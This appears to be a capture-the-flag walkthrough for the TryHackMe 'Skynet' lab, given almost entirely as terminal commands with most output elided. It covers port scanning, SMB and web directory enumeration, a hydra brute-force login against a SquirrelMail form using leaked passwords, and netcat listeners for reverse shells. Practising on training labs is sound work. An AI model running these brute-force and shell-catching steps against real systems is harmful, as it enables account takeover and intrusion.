...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ sudo nmap -sS -sC -sV -O 10.10.154.180
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ smbclient -L 10.10.154.180
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ gobuster dir -u 10.10.154.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
bibo318@parrot:~/CTFs/tryhackme/Skynet$ cat logs/log1.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ hydra -l milesdyson -P logs/log1.txt 10.10.154.180 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ smbclient -U milesdyson //10.10.154.180/milesdyson
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ cat important.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ gobuster dir -u http://10.10.154.180/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ nc -nlvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Skynet$ nc -lnvp 9002listening on [any] 9002 ...
